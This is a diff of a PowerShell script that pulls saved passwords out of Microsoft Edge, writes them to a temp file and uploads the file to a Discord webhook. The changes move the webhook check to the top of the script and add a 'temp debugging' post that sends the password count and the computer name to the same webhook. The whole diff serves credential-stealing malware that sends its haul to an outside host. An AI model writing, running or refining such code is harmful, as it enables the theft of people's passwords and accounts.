@@ -1,4 +1,10 @@
+# Get webhook URL from environment variable
 $WebhookUrl = $env:DISCORD_WEBHOOK_URL
+
+if ([string]::IsNullOrEmpty($webhookUrl)) {
+    Write-Error "No webhook URL set. Exiting."
+    exit 1
+}
 
 # Optional: Send immediate ping to confirm execution
 Invoke-RestMethod -Uri $WebhookUrl -Method Post -Body (@{ content = "✅ New script triggered on $env:COMPUTERNAME" } | ConvertTo-Json) -ContentType 'application/json'
@@ -259,6 +265,11 @@ $edgeLocalState = Join-Path $env:LOCALAPPDATA "Microsoft\Edge\User Data\Local St
 # Extract Edge passwords
 $edgeResults = Extract-EdgePasswords -loginDataPath $edgeLoginData -localStatePath $edgeLocalState
 
+#temp debugging
+Invoke-RestMethod -Uri $WebhookUrl -Method Post -Body (@{
+    content = "🔍 Extracted $($edgeResults.Count) password entries from Edge on $env:COMPUTERNAME"
+} | ConvertTo-Json) -ContentType 'application/json'
+
 # Output to file in temp directory instead of Desktop
 $outputFile = Join-Path $tempDir "EdgePasswords.txt"
 
@@ -270,14 +281,6 @@ $edgeResults | ForEach-Object {
 } | Out-File -FilePath $outputFile -Encoding utf8
 
 Write-Host "Passwords saved to: $outputFile"
-
-# Get webhook URL from environment variable
-# $WebhookUrl = $env:DISCORD_WEBHOOK_URL
-
-if ([string]::IsNullOrEmpty($webhookUrl)) {
-    Write-Error "No webhook URL set. Exiting."
-    exit 1
-}
 
 # Send to Discord webhook using Invoke-RestMethod -Form to upload file properly
 if (Test-Path $outputFile) {
